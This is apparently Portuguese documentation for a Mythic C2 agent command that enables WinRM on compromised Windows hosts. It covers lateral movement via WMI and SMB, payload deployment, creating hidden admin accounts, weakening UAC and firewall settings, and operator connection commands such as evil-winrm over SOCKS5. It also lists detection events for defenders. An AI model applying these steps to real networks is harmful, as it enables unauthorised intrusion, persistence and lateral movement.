# winrm_ext

Comando do agente **Anubis** (Mythic) para configurar e ativar **WinRM** no host do agente (*self-host*) ou em outro host via movimento lateral a partir do agente (*remote*), com acesso operacional via tunnel **SOCKS5**.

| Campo | Valor |
|-------|-------|
| **Command** | `winrm_ext` |
| **Agent** | Anubis (Python) |
| **OS** | Windows |
| **Author** | @wtechsec |
| **MITRE ATT&CK** | T1021.006, T1090, T1562.004, T1136.001, T1570 |

---

## Visão geral

O `winrm_ext` prepara o alvo para remoting Windows (WinRM/WS-Management) e devolve comandos prontos para o operador conectar via **evil-winrm**, **netexec (nxc)** ou **PowerShell Remoting**, preferencialmente através do SOCKS5 aberto no servidor Mythic.

Dois modos principais:

| Modo | Quando usar | O que faz |
|------|-------------|-----------|
| **Self-host** | Agente já está no alvo | Configura WinRM **no próprio host** do agente (listener, auth, UAC, firewall, serviço) |
| **Remote (A→B)** | Agente no HOST-A, alvo é HOST-B | A partir do agente, configura WinRM **em outro host** (cadeia PSRemoting → WMI → SMB) e opcionalmente faz **deploy** de payload |

---

## Arquivos no repositório

```
commands/winrm_ext/
├── winrm_ext.py              # agent_code (métodos winrm_ext + _winrm_ext_remote)
├── winrm_ext_functions.py    # agent_functions (Mythic CommandBase / argumentos)
└── winrm_ext.md              # esta documentação
```

> **Importante (agent_code):** `winrm_ext` e `_winrm_ext_remote` devem ser métodos da classe do agente (indentação de 4 espaços no `def`). Indentação em coluna 0 quebra o payload (IndentationError → processo abre e fecha).

---

## Pré-requisitos

### No alvo (Windows)

- Privilégios elevados no host onde a configuração será aplicada (self-host: contexto do agente; remote: credencial **admin local** ou equivalente no HOST-B).
- Contas locais comuns podem ser bloqueadas pelo **UAC remote filtering**; o comando ajusta `LocalAccountTokenFilterPolicy` quando possível.
- Portas relevantes no caminho A→B: **5985/5986** (WinRM), **135** (WMI/RPC), **445** (SMB).

### No operador (Kali / jump)

```bash
sudo apt install evil-winrm
pipx install netexec    # nxc winrm com --proxy socks5://...
# opcional
sudo apt install proxychains4
```

### No Mythic

- Callback Anubis ativo no HOST-A (ou no próprio alvo, no modo self-host).
- Porta SOCKS5 livre no servidor (padrão **7005**), ou já em uso (o comando reutiliza o tunnel).

---

## Parâmetros

| Parâmetro | Tipo | Padrão | Descrição |
|-----------|------|--------|-----------|
| `remote` | string | `""` | IP/hostname do **HOST-B**. Vazio = modo **self-host**. |
| `target` | string | `""` | IP/hostname anunciado nos comandos de conexão (self-host). Vazio = IP local detectado. |
| `port` | number | `5985` | Porta WinRM. Com `ssl=true` e porta 5985, sobe automaticamente para **5986**. |
| `username` | string | `""` | Usuário (admin no alvo). Obrigatório no modo **remote**. |
| `password` | string | `""` | Senha. Obrigatório no modo **remote**. |
| `domain` | string | `""` | Domínio Windows (ex: `CORP`). Vazio = conta local. |
| `socks_port` | number | `7005` | Porta SOCKS5 no servidor Mythic. |
| `add_user` | string | `""` | Cria usuário local e adiciona a **Administrators** / **Administradores**. |
| `add_pass` | string | `""` | Senha do `add_user`. Vazio = senha aleatória gerada. |
| `ssl` | bool | `false` | HTTPS (listener 5986 + certificado autoassinado no self-host; no remote depende do canal). |
| `action` | string | `""` | `cleanup` reverte firewall, listener, registro e usuário criado. |
| `deploy` | string | `""` | (**remote**) Caminho do payload Anubis **no HOST-A**; copia para `\\B\C$\Windows\Temp` e executa. |

Argumentos podem ser passados em **JSON** ou de forma **posicional** (self-host simplificado):

```text
winrm_ext [target_ip] [username] [password] [domain]
```

---

## Como funciona

### Self-host

1. Ajusta registro WSMAN:
   - `AllowUnencrypted=1` (se não for SSL)
   - `Auth\Basic=1`
2. Define `LocalAccountTokenFilterPolicy=1` (admins locais em logon remoto).
3. Cria listener em `WSMAN\Listener\{GUID}` (HTTP ou HTTPS).
4. Garante serviço **WinRM** em AutoStart e em execução (SCM via ctypes).
5. Regra de firewall inbound `AnubisWinRM-<port>` (netsh).
6. Opcional: cria `add_user` local admin.
7. Probe TCP e imprime comandos evil-winrm / nxc / pwsh via SOCKS5.
8. Persiste estado em `%TEMP%\anubis_winrm_ext_state.json` para `cleanup`.

### Remote (A → B)

Cadeia de bootstrap no HOST-B, na ordem:

1. **PSRemoting** — se a porta WinRM já estiver aberta.
2. **WMI (CIM)** — `Win32_Process.Create` com PowerShell encoded.
3. **SMB** — `reg` remoto + `sc \\host` + `schtasks` / `netsh -r`.

Fluxo típico:

```text
Probe 5985/135/445
    → Bootstrap (auth, listener, firewall, restart WinRM)
    → (opcional) add_user
    → (opcional) deploy payload → novo callback no Mythic
    → Comandos de acesso (SOCKS5 + one-liners a partir do HOST-A)
```

Estado remoto: `%TEMP%\anubis_winrm_ext_remote_state.json` no HOST-A.

### Cleanup

- **Self-host:** `action=cleanup` — remove regra de firewall, listeners criados, restaura valores de registro e apaga usuário criado.
- **Remote:** `remote=<host>` + `action=cleanup` + credenciais — tenta reverter no B via PSRemoting → WMI → schtasks.

---

## Uso via Mythic

### 1) Self-host no callback atual

No tasking do agente:

```json
winrm_ext {"target":"10.2.0.12","username":"Administrator","password":"P@ssw0rd"}
```

Ou posicional:

```text
winrm_ext 10.2.0.12 Administrator P@ssw0rd
```

Com usuário local de fallback e SOCKS customizado:

```json
winrm_ext {
  "target": "10.2.0.12",
  "username": "Administrator",
  "password": "P@ssw0rd",
  "add_user": "svc_help",
  "add_pass": "Tmp#2026!",
  "socks_port": 7005
}
```

HTTPS:

```json
winrm_ext {"target":"10.2.0.12","ssl":true,"username":"Administrator","password":"P@ssw0rd"}
```

### 2) Remote — configurar WinRM no HOST-B a partir do HOST-A

```json
winrm_ext {
  "remote": "10.2.0.20",
  "username": "adm",
  "password": "P@ss",
  "domain": "CORP"
}
```

### 3) Remote + deploy de payload

No HOST-A, path local do payload gerado pelo Mythic:

```json
winrm_ext {
  "remote": "10.2.0.20",
  "username": "adm",
  "password": "P@ss",
  "domain": "CORP",
  "deploy": "C:\\Windows\\Temp\\anubis.exe"
}
```

Após o novo callback no HOST-B, rode **self-host** nesse agente para expor WinRM via SOCKS5.

### 4) Cleanup

Self-host:

```json
winrm_ext {"action":"cleanup"}
```

Remote:

```json
winrm_ext {
  "remote": "10.2.0.20",
  "action": "cleanup",
  "username": "adm",
  "password": "P@ss",
  "domain": "CORP"
}
```

### 5) Conexão do operador (após sucesso)

O output do task lista comandos. Exemplos típicos:

```bash
# evil-winrm via proxychains + SOCKS do Mythic
proxychains evil-winrm -i 10.2.0.20 -u 'CORP\adm' -p 'P@ss' -P 5985

# netexec com proxy SOCKS5 nativo
nxc winrm 10.2.0.20 -u adm -p 'P@ss' -d CORP -P 5985 --proxy socks5://127.0.0.1:7005
```

Garanta que o SOCKS5 da task/porta informada esteja ativo no Mythic (o `create_go_tasking` tenta iniciar; se a porta já estiver em uso, reutiliza).

---

## Fluxos recomendados

### Fluxo 1 — Só acesso WinRM no host do agente

```text
Callback Anubis (alvo)
  → winrm_ext self-host
  → operador: evil-winrm / nxc via SOCKS5
  → ao final: winrm_ext {"action":"cleanup"}
```

### Fluxo 2 — Lateral movement + novo agente

```text
Callback Anubis (HOST-A)
  → winrm_ext remote + deploy
  → novo callback (HOST-B)
  → no novo agente: winrm_ext self-host
  → operador: SOCKS5 → evil-winrm no HOST-B
  → cleanup em A e/ou B
```

### Fluxo 3 — Só abrir WinRM em B (sem deploy)

```text
Callback (HOST-A) com credencial admin em B
  → winrm_ext remote (sem deploy)
  → operador acessa B via SOCKS5
```

---

## Detecção e OPSEC (defensor)

Eventos e artefatos úteis para detecção:

| Sinal | Onde |
|-------|------|
| 4624 Type 3 / 4625 | Logon de rede (WinRM/SMB) |
| 4720 / 4732 | Criação de usuário / adição a Administrators (`add_user`) |
| 7036 | Restart do serviço WinRM |
| WinRM Operational 91 / 142 | Atividade do serviço WinRM |
| 4946 | Regra de firewall adicionada (`AnubisWinRM-*`) |
| 4104 | Script block logging (PowerShell encoded / bootstrap) |
| Arquivos de estado | `%TEMP%\anubis_winrm_ext_state.json`, `anubis_winrm_ext_remote_state.json` |

Recomendações ofensivas (contexto autorizado):

- Preferir contas de domínio com admin local a contas locais sem `LocalAccountTokenFilterPolicy`.
- Usar `cleanup` ao final do exercício.
- Evitar deixar listeners/regras `AnubisWinRM-*` permanentes em produção.
- Tratar `deploy` como etapa explícita de autorização no ROE.

---

## Troubleshooting

| Sintoma | Causa provável | Ação |
|---------|----------------|------|
| Agent abre e fecha após incluir o comando | `def winrm_ext` fora da classe (indent 0) | Agent_code com métodos a **4 espaços**; validar `python3 -m py_compile` |
| `credenciais obrigatórias` no remote | `username`/`password` vazios | Passar admin válido no JSON |
| Probe 5985 closed e WMI/SMB falham | Firewall/GPO ou credencial sem admin | Validar 135/445 e privilégio no B |
| PSRemoting Access Denied | UAC remote filter / não admin | Usar RID 500, conta domínio admin local, ou bootstrap que seta `LocalAccountTokenFilterPolicy` |
| SOCKS “already in use” | Tunnel já ativo na porta | Esperado; reutilizar a mesma porta |
| evil-winrm não conecta | SOCKS não apontado / porta errada | `proxychains` ou `nxc --proxy socks5://127.0.0.1:<socks_port>` |

---

## Integração no Mythic (rebuild)

1. Copiar `winrm_ext.py` para o **agent_code** do comando no payload type Anubis.
2. Copiar `winrm_ext_functions.py` para o **agent_functions** (CommandBase).
3. Garantir que no código final do agent os métodos estejam **dentro** da classe (indentação de método).
4. Rebuild da payload type / container se necessário.
5. Gerar novo payload e validar:

```bash
python3 -m py_compile <agent_payload.py>
```

6. Task de teste em lab: self-host → probe REACHABLE → cleanup.

---

## Referência rápida de tasking

```text
# Self-host
winrm_ext {"target":"<IP>","username":"<user>","password":"<pass>"}

# Self-host + user local
winrm_ext {"add_user":"svc_help","add_pass":"Tmp#2026!"}

# Remote
winrm_ext {"remote":"<IP-B>","username":"<user>","password":"<pass>","domain":"<DOM>"}

# Remote + deploy
winrm_ext {"remote":"<IP-B>","username":"<user>","password":"<pass>","domain":"<DOM>","deploy":"C:\\Windows\\Temp\\anubis.exe"}

# Cleanup self-host
winrm_ext {"action":"cleanup"}

# Cleanup remote
winrm_ext {"remote":"<IP-B>","action":"cleanup","username":"<user>","password":"<pass>","domain":"<DOM>"}
```

---

## Licença e uso

Uso restrito a **engajamentos autorizados** (Red Team / pentest com ROE definido).  
WTechSec — Red Team Operations.
